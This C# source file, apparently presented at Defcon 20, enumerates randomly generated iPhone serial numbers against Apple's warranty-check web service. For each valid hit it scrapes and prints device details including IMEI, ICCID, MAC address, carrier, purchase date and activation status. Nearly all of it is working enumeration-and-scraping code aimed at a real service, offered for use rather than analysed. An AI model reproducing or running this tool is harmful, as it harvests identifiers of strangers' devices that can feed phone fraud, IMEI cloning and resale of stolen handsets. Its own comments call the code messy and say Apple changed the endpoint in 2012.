//Code: Darkred for Defcon 20
//Products: Apple
//Program Goal: Create iPhone serials then grab information about them
//Status: Some invalid, Others valid. Code is messy like no other. Apple started messing with this around 7/8/2012
using System;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
namespace AppleData
{
    class Program

    {
        static String postData = "This is an automated request"; 
        static void Main(string[] args)
        {
            Console.Title = "Apple Serial Checker";
            String iphoneSerial;
            String serverOutput;
            String quoteCommaQuote = (char)34 + ":" + (char)34; //Saves space later on
            int Seed = (int)DateTime.Now.Ticks; //Seeding the RNG
            String quote = (char)34 + ""; //quick and dirty quote shortcut
            Random random = new Random(Seed); //RNG with seed
            iphoneSerial = "DNPG"; //Factory (Try C39G for more serials)
            iphoneSerial += (char)random.Next(65, 90);
            iphoneSerial += random.Next(1,6);
            iphoneSerial += (char)random.Next(65, 77);
            iphoneSerial += random.Next(1, 10);
            iphoneSerial += "DTF9"; //Color and some model data
            WebRequest request = WebRequest.Create("https://selfsolve.apple.com/warrantyChecker.do?sn=" + iphoneSerial); //Apple warranty check link
            request.Method = "POST"; 
            byte[] byteArray = Encoding.UTF8.GetBytes(postData);
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = byteArray.Length;
            Stream dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();
            WebResponse response = request.GetResponse();
            dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            string responseFromServer = reader.ReadToEnd();
            serverOutput = responseFromServer; //Store string
            reader.Close();
            dataStream.Close();
            response.Close();
            Console.WriteLine("Serial: " + iphoneSerial);
            String isInvalid = StrSplit(serverOutput,"HW_HAS_APP" + quoteCommaQuote,quote);
            if (isInvalid.Length != 0) //Checking for invalid serial
            {
                Console.WriteLine("Product: " + StrSplit(serverOutput, "PART_DESCR" + quoteCommaQuote, quote));
                Console.WriteLine("Has Apple Protection Plan?: " + isInvalid); //using some old data
                Console.WriteLine("Has Phone Support Coverage?: " + StrSplit(serverOutput,"PH_HAS_COVERAGE" + quoteCommaQuote,quote));
                Console.WriteLine("Carrier purchased with: " + StrSplit(serverOutput, "CARRIER" + quoteCommaQuote, quote));
                Console.WriteLine("Date of purchase: " + StrSplit(serverOutput, "PURCHASE_DATE" + quoteCommaQuote, quote));
                Console.WriteLine("MAC Address: " + StrSplit(serverOutput, "MAC_ADDRESS" + quoteCommaQuote, quote));
                Console.WriteLine("Phone Flagged?: " + StrSplit(serverOutput, "CARRIER" + quoteCommaQuote, quote));
                Console.WriteLine("IMEI Flagged?: " + StrSplit(serverOutput, "ASSET_TAG" + quoteCommaQuote, quote));
                Console.WriteLine("Personalized?: " + StrSplit(serverOutput, "PERSONALIZED" + quoteCommaQuote, quote));
                Console.WriteLine("Activated?: " + StrSplit(serverOutput, "ACTIVATION_STATUS" + quoteCommaQuote, quote));
                Console.WriteLine("Registered?: " + StrSplit(serverOutput, "AP_IMEI_NUM" + quoteCommaQuote, quote));
                Console.WriteLine("Asset Tag: " + StrSplit(serverOutput, "ASSET_TAG" + quoteCommaQuote, quote));
                Console.WriteLine("IMEI: " + StrSplit(serverOutput, "AP_IMEI_NUM" + quoteCommaQuote, quote));
                Console.WriteLine("ICCID: " + StrSplit(serverOutput, "ICCID" + quoteCommaQuote, quote));
                Console.WriteLine("Days remaning in coverage: " + StrSplit(serverOutput, "AYS_REM_IN_COV" + quoteCommaQuote, quote));
                Console.WriteLine("Has Warranty: " + StrSplit(serverOutput, "HW_HAS_COVERAGE" + quoteCommaQuote, quote));
                Console.WriteLine("Days since purchase: " + StrSplit(serverOutput, "NUM_DAYS_SINCE_DOP" + quoteCommaQuote, quote));
                Console.WriteLine("Last unbrick date: " + StrSplit(serverOutput, "LAST_UNBRICK_DT" + quoteCommaQuote, quote));
            }
            else
            {
                Console.WriteLine("Oh this is embarrassing, invalid serial please try again");
            }
            Console.WriteLine("Press enter to continue...");
            Console.ReadLine();
        }
        //Easy parsing of apple results
        private static string StrSplit( string strSource,  string strStart,  string strEnd)
        {
            int stPos = 0;
            int stEnd = 0;
            int lengthStr = strStart.Length;
            string strResult = null;
            strResult = string.Empty;
            stPos = strSource.IndexOf(strStart, 0);
            stEnd = strSource.IndexOf(strEnd, stPos + lengthStr);
            if (stPos != -1 && stEnd != -1)
            {
                strResult = strSource.Substring(stPos + lengthStr, stEnd - (stPos + lengthStr));
            }
            return strResult;
        }
    }
}
